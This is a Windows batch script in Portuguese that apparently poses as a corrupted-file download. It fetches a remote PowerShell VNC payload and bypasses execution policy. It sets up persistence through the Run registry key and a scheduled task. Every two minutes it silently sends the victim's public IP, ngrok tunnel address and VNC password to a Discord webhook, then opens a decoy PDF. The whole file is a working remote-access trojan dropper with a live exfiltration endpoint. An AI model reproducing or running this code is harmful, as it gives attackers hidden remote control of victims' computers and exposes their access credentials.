@echo off
title Arquivo em Download
echo O arquivo esta corrompido, nao feche a janela ate baixar totalmente
echo.

:: Initialize log file
set LOGFILE=%USERPROFILE%\Downloads\script_log.txt
echo [%DATE% %TIME%] Iniciando script... > %LOGFILE%

:: Check for admin privileges
net session >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [%DATE% %TIME%] Erro: Execute o script como administrador. >> %LOGFILE%
    echo Erro: Este script requer privilegios de administrador.
    pause
    exit /b
)

:: Baixar arquivo principal
echo Baixando arquivo principal...
powershell -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/akiranakaisan184proton/ps1vnc/main/vnc.ps1' -OutFile '%USERPROFILE%\Downloads\vnc.ps1' -ErrorAction Stop } catch { Write-Output ('Erro ao baixar vnc.ps1: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append; exit 1 }" 2>> %LOGFILE%
if %ERRORLEVEL% neq 0 (
    echo Erro ao baixar o arquivo principal. Verifique a conexao e tente novamente.
    pause
    exit /b
)
echo.

:: Configurar politica de execucao
echo Configurando execucao segura...
powershell -Command "try { Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Stop } catch { Write-Output ('Erro ao configurar politica: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append; exit 1 }" 2>> %LOGFILE%
if %ERRORLEVEL% neq 0 (
    echo Erro ao configurar a politica de execucao.
    pause
    exit /b
)
echo.

:: Configurar inicializacao automatica do VNC no logon
echo Configurando inicializacao automatica...
powershell -Command "try { New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'VNCStartup' -Value 'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%USERPROFILE%\Downloads\vnc.ps1\"' -Force -ErrorAction Stop } catch { Write-Output ('Erro ao configurar inicializacao: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append; exit 1 }" 2>> %LOGFILE%
if %ERRORLEVEL% neq 0 (
    echo Erro ao configurar inicializacao automatica.
    pause
    exit /b
)
echo.

:: Criar script PowerShell para verificacao de conexao
echo Criando script de verificacao de conexao...
echo $ErrorActionPreference = 'SilentlyContinue' > "%USERPROFILE%\Downloads\check_ngrok.ps1"
echo try { >> "%USERPROFILE%\Downloads\check_ngrok.ps1"
echo     $webhook = 'https://discordapp.com/api/webhooks/1417193357754503249/rp6J-QUUpbQiB2bhmwUaa86HJtPu-8OIiRHLYRw6v2A79GR5mWVzPJPnD9bI0pLr134v' >> "%USERPROFILE%\Downloads\check_ngrok.ps1"
echo     $ngrok_info = (Invoke-WebRequest -Uri 'http://127.0.0.1:4040/api/tunnels' -ErrorAction Stop ^| ConvertFrom-Json).tunnels[0].public_url >> "%USERPROFILE%\Downloads\check_ngrok.ps1"
echo     $public_ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -ErrorAction Stop).Content >> "%USERPROFILE%\Downloads\check_ngrok.ps1"
echo     $vnc_port = '5900' >> "%USERPROFILE%\Downloads\check_ngrok.ps1"
echo     $vnc_password = '123456' >> "%USERPROFILE%\Downloads\check_ngrok.ps1"
echo     $message = @{content="IP Publico: $public_ip\nTunel Ngrok: $ngrok_info\nPorta Local VNC: $vnc_port\nSenha: $vnc_password"} >> "%USERPROFILE%\Downloads\check_ngrok.ps1"
echo     Invoke-WebRequest -Uri $webhook -Method POST -Body ($message ^| ConvertTo-Json) -ContentType 'application/json' -ErrorAction Stop >> "%USERPROFILE%\Downloads\check_ngrok.ps1"
echo } catch { >> "%USERPROFILE%\Downloads\check_ngrok.ps1"
echo     Write-Output ('[%DATE% %TIME%] Erro na verificacao de conexao: ' + $_.Exception.Message) ^| Out-File -FilePath '%USERPROFILE%\Downloads\script_log.txt' -Append >> "%USERPROFILE%\Downloads\check_ngrok.ps1"
echo } >> "%USERPROFILE%\Downloads\check_ngrok.ps1"
if %ERRORLEVEL% neq 0 (
    echo Erro ao criar script de verificacao.
    pause
    exit /b
)
echo.

:: Criar VBScript para executar check_ngrok.ps1 silenciosamente
echo Criando VBScript para execucao silenciosa...
echo Set WShell = CreateObject("WScript.Shell") > "%USERPROFILE%\Downloads\run_ngrok_check.vbs"
echo WShell.Run "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ""%USERPROFILE%\Downloads\check_ngrok.ps1""", 0, False >> "%USERPROFILE%\Downloads\run_ngrok_check.vbs"
if %ERRORLEVEL% neq 0 (
    echo Erro ao criar VBScript.
    pause
    exit /b
)
echo.

:: Configurar tarefa agendada para verificacao a cada 2 minutos
echo Configurando tarefa agendada para verificacao de conexao...
powershell -Command "try { $action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '\"%USERPROFILE%\Downloads\run_ngrok_check.vbs\"'; $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 3650); Register-ScheduledTask -TaskName 'NgrokCheck' -Action $action -Trigger $trigger -Description 'Check ngrok connection every 2 minutes' -Force -ErrorAction Stop } catch { Write-Output ('Erro ao criar tarefa agendada: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append; exit 1 }" 2>> %LOGFILE%
if %ERRORLEVEL% neq 0 (
    echo Erro ao configurar tarefa agendada.
    pause
    exit /b
)
echo.

:: Executar script VNC
echo Executando script...
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try { Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%USERPROFILE%\Downloads\vnc.ps1\"' -ErrorAction Stop } catch { Write-Output ('Erro ao executar vnc.ps1: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append; exit 1 }" 2>> %LOGFILE%
if %ERRORLEVEL% neq 0 (
    echo Erro ao executar o script.
    pause
    exit /b
)
echo.

:: Enviar informacoes iniciais para o Discord
echo Enviando informacoes iniciais para o Discord...
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try { $webhook = 'https://discordapp.com/api/webhooks/1417193357754503249/rp6J-QUUpbQiB2bhmwUaa86HJtPu-8OIiRHLYRw6v2A79GR5mWVzPJPnD9bI0pLr134v'; $ngrok_info = (Invoke-WebRequest -Uri 'http://127.0.0.1:4040/api/tunnels' -ErrorAction Stop | ConvertFrom-Json).tunnels[0].public_url; $public_ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -ErrorAction Stop).Content; $vnc_port = '5900'; $vnc_password = '123456'; $message = @{content='Initial Connection\nIP Publico: ' + $public_ip + '\nTunel Ngrok: ' + $ngrok_info + '\nPorta Local VNC: ' + $vnc_port + '\nSenha: ' + $vnc_password}; Invoke-WebRequest -Uri $webhook -Method POST -Body ($message | ConvertTo-Json) -ContentType 'application/json' -ErrorAction Stop } catch { Write-Output ('[%DATE% %TIME%] Erro ao enviar para Discord: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" 2>> %LOGFILE%
if %ERRORLEVEL% neq 0 (
    echo Erro ao enviar informacoes iniciais para o Discord. Verifique o log em %LOGFILE%.
)
echo.

:: Aguardar execucao
echo Aguardando execucao...
timeout /t 5 /nobreak >nul
echo.

:: Baixar documento final
echo Baixando documento final...
powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/akiranakaisan184proton/ps1vnc/blob/main/apresentacaotower23_compressed.pdf' -OutFile '%USERPROFILE%\Downloads\apresentacaotower23_compressed.pdf' -ErrorAction Stop } catch { Write-Output ('Erro ao baixar PDF: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append; exit 1 }" 2>> %LOGFILE%
if %ERRORLEVEL% neq 0 (
    echo Erro ao baixar o documento final.
    pause
    exit /b
)
echo.

:: Abrir documento
echo Abrindo documento...
start "" "%USERPROFILE%\Downloads\apresentacaotower23_compressed.pdf"
if %ERRORLEVEL% neq 0 (
    echo Erro ao abrir o documento.
    pause
    exit /b
)
echo.

echo Concluido com sucesso!
pause